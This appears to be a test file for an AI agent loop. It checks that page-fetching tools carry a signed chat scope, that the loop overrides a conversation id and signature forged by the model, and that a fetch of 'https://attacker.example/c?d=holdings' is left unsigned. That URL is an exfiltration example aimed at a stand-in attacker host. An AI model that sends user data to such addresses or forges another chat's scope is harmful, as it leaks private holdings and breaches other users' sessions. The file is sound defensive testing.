/**
 * Tier 2 — what the loop adds to the calls of the page tools.
 *
 * `fetch_webpage` holds the page it fetched for the chat, and `inspect_webpage` reads parts of it, so both
 * carry the chat's scope key and its signature (the tools check the signature before they hold or read
 * anything). The address a fetch is given is signed only if it was in what the model was given.
 */

import { describe, it, expect, beforeEach } from "bun:test";
import { runAgentLoop, _resetWidgetDataCache } from "../../../src/agent/loop";
import { signScope } from "../../../src/lib/scope";
import type { AgentTool, QueryRequest, SSEEvent } from "../../../src/protocol/types";
import { llmCallsTool, makeMockLlm } from "../../helpers/mock-llm";
import { collectGenerator } from "../../helpers/sse-reader";
import { clearAllModuleState } from "../../helpers/clear-state";

beforeEach(() => {
  clearAllModuleState();
  _resetWidgetDataCache();
});

const SECRET = "0123456789abcdef0123";

function tools(): AgentTool[] {
  const base = { server_id: "ines", url: "http://localhost:8787/mcp" };
  return [
    {
      ...base,
      name: "fetch_webpage",
      description: "Fetch a page",
      input_schema: { properties: { url: { type: "string" }, "x-ines-conversation-id": { type: "string" }, "x-ines-scope-sig": { type: "string" } }, required: ["url"] },
    },
    {
      ...base,
      name: "inspect_webpage",
      description: "Read parts of a page",
      input_schema: {
        properties: { page_id: { type: "string" }, view: { type: "string" }, "x-ines-conversation-id": { type: "string" }, "x-ines-scope-sig": { type: "string" } },
        required: ["page_id", "view"],
      },
    },
    { ...base, name: "web_search", description: "Search", input_schema: { properties: { query: { type: "string" } }, required: ["query"] } },
  ];
}

async function run(tool: string, input: Record<string, unknown>, conversationId: string, message = "read https://example.com/report"): Promise<Record<string, unknown>> {
  const events: SSEEvent[] = await collectGenerator(
    runAgentLoop({
      request: { messages: [{ role: "human", content: message }], tools: tools() } as QueryRequest,
      rawModelId: "openai:gpt-4o-mini",
      model: makeMockLlm(llmCallsTool(tool, input)),
      allWidgets: [],
      workspaceState: null,
      conversationId,
      scopeSecret: SECRET,
    }),
  );
  const call = events.find((e) => e.event === "copilotFunctionCall" && (e.data as { function?: string }).function === "execute_agent_tool");
  if (!call) throw new Error("no tool call emitted");
  return (call.data as { input_arguments: { parameters: Record<string, unknown> } }).input_arguments.parameters;
}

describe("the page tools carry the chat's signed scope", () => {
  it("fetch_webpage does, and its address is signed because the user gave it", async () => {
    const params = await run("fetch_webpage", { url: "https://example.com/report" }, "u1:chat1");
    expect(params["x-ines-conversation-id"]).toBe("u1:chat1");
    expect(params["x-ines-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
    expect(typeof params["x-ines-url-sig"]).toBe("string");
  });

  it("inspect_webpage does, and has no address to sign", async () => {
    const params = await run("inspect_webpage", { page_id: "p-0123abcd", view: "text" }, "u1:chat1");
    expect(params["x-ines-conversation-id"]).toBe("u1:chat1");
    expect(params["x-ines-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
    expect(params["x-ines-url-sig"]).toBeUndefined();
  });

  it("is the loop's chat, not one the model wrote", async () => {
    const params = await run(
      "inspect_webpage",
      { page_id: "p-0123abcd", view: "text", "x-ines-conversation-id": "victim:chat", "x-ines-scope-sig": "forged" },
      "u1:chat1",
    );
    expect(params["x-ines-conversation-id"]).toBe("u1:chat1");
    expect(params["x-ines-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
  });

  it("is not added to a tool that holds no page", async () => {
    const params = await run("web_search", { query: "nvidia revenue" }, "u1:chat1");
    expect(params["x-ines-conversation-id"]).toBeUndefined();
    expect(params["x-ines-scope-sig"]).toBeUndefined();
  });

  it("is left out when the loop has no chat, whatever the model wrote", async () => {
    const params = await run("inspect_webpage", { page_id: "p-0123abcd", view: "text", "x-ines-conversation-id": "victim:chat" }, "");
    expect(params["x-ines-conversation-id"]).toBeUndefined();
    expect(params["x-ines-scope-sig"]).toBeUndefined();
  });
});

describe("an address the model chose is not signed", () => {
  it("is not, for a fetch of an address that was nowhere in what the model was given", async () => {
    const params = await run("fetch_webpage", { url: "https://attacker.example/c?d=holdings" }, "u1:chat1", "read https://example.com/report");
    expect(params["x-ines-url-sig"]).toBeUndefined();
  });
});
